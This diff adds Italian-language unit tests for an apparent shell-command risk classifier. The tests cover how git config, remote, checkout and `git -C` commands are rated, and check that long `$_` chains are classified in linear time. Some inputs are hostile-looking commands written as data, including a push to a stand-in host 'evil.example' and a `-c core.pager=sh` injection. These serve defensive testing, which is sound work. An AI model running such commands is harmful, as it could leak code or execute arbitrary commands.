@@ -1797,6 +1797,60 @@ test('#1994 — le graffe si aprono in un tempo che cresce con la lunghezza, non
   assert.equal(C.classify('git log --{{out}put=x,}', ctx), 1);
 });
 
+test('#1994.1 — una lunga catena che si passa $_ si misura in un tempo che cresce con la lunghezza', () => {
+  for (const shell of ['bash', 'sh']) {
+    const ctx = { cwd: '/home/u/proj', home: '/home/u', shell };
+    // Col conto rifatto a ogni `$_` quattromila comandi costavano più di cento unità, dodicimila più di mille.
+    const c = costoInUnita(() => {
+      C.classify(`echo a; ${'git log $_; '.repeat(4000)}`, ctx);
+      C.classify(`echo a; ${'git log $_; '.repeat(12000)}`, ctx);
+      C.classify(`${'echo x || '.repeat(15)}echo a; ${'git log $_; '.repeat(12000)}`, ctx);
+    }, { tetto: 60 });
+    assert.ok(c.entro, `${shell}: ${c.come}`);
+    // Dentro il tetto delle misure `$_` vale ancora il suo valore; oltre, la riga chiede.
+    assert.equal(C.classify(`echo a; ${'git log $_; '.repeat(4000)}`, ctx), 1, shell);
+    assert.equal(C.classify(`echo --output=x; ${'git log $_; '.repeat(4000)}`, ctx), 3, shell);
+    assert.equal(C.classify(`echo a; ${'git log $_; '.repeat(12000)}`, ctx), 3, shell);
+  }
+});
+
+test('#1994.1 — le opzioni di git config e git remote valgono anche accorciate, il nome intero vince', () => {
+  for (const cmd of ['git config --unset-a core.hooksPath', 'git config --remove-sec remote.origin', 'git config --unset-al x',
+    'git config --un x.y', 'git checkout --our x', 'git checkout --the x', 'git checkout --pat', 'git checkout --pathspec-f=l.txt',
+    'git push --rep=git@evil.example:r.git', 'git push --repo=git@evil.example:r.git']) assert.equal(lvl(cmd), 3, cmd);
+  for (const cmd of ['git config --lis', 'git config --li', 'git config --get-r url', 'git config --get-u http.x u', 'git config --a x.y z',
+    'git config --rename-s a b', 'git config --ed', 'git config set --app x.y z', 'git config get --reg x', 'git config get --ur=u x.y',
+    'git remote --verb', 'git remote --v', 'git remote -vv', 'git checkout --orph nuovo', 'git checkout --det']) assert.equal(lvl(cmd), 2, cmd);
+  // `--get` e `--unset` scritti per intero sono loro, non l'inizio di `--get-regexp` o `--unset-all`.
+  for (const cmd of ['git config --get user.email', 'git config --gl user.name', 'git config --loc core.x', 'git remote', 'git config user.email']) {
+    assert.equal(lvl(cmd), 1, cmd);
+  }
+  assert.equal(lvl('git config --unset user.name'), 3);
+});
+
+test('#1994.1 — git -C vale come un cd prima del comando, e la sonda guarda quella cartella', () => {
+  const ctx = { cwd: '/home/u/proj', home: '/home/u', shell: 'bash' };
+  const sondate = [];
+  const sonda = { ...ctx, gitLancia: (d) => { sondate.push(d); return d.includes('ostile') ? 'si' : ''; } };
+  for (const [g, cd] of [['git -C ~/progetto status', 'cd ~/progetto && git status'], ['git -C /etc log', 'cd /etc && git log'],
+    ['git -C ~/ostile log', 'cd ~/ostile && git log'], ['git -C a -C b status', 'cd a && cd b && git status'],
+    ['git -C ~/p --no-pager log -1', 'cd ~/p && git --no-pager log -1'], ['git -C ~/p push origin main', 'cd ~/p && git push origin main']]) {
+    for (const cc of [undefined, ctx, sonda]) assert.equal(C.classify(g, cc), C.classify(cd, cc), `${g} | ${cd}`);
+  }
+  assert.equal(C.classify('git -C ~/progetto status', sonda), 1);
+  assert.deepEqual(C.classifyDetail('git -C ~/ostile log', sonda).level, 2);
+  assert.ok(sondate.includes('/home/u/ostile') && sondate.includes('/home/u/proj/a/b'), sondate.join(', '));
+  // Il comando dopo `-C` si misura per intero; quello che qui non si legge come la shell resta a «conferma».
+  for (const cmd of ['git -C ~/p push --force', 'git -C ~/p checkout .', 'git -C ~/p log --output=x', 'git -C ~/p -c core.pager=sh log',
+    'git -C ~/p --git-dir=/x log', 'git -C $X status', 'git -C "a b" status', 'git -C a\\ b status', 'git -C -x status', 'git -C ~/p']) {
+    assert.equal(C.classify(cmd, sonda), 3, cmd);
+  }
+  // In PowerShell `~` lo espande solo `cd`: a git arriva scritto così.
+  const ps = { cwd: 'C:\\Users\\u\\proj', home: 'C:\\Users\\u', shell: 'powershell', win: true, gitLancia: () => '' };
+  assert.equal(C.classify('git -C ~/p status', ps), 3);
+  assert.equal(C.classify('git -C C:\\Users\\u\\p status', ps), 1);
+});
+
 // #2345: il segnaposto di un gruppo comincia con `$_`, e in sh e bash veniva preso per l'ultimo argomento: ogni
 // sottoshell di sole letture chiedeva la conferma forte.
 test('#2345 — in sh e bash un gruppo di sole letture resta 1; un `$_` vero dentro il gruppo resta 3', () => {
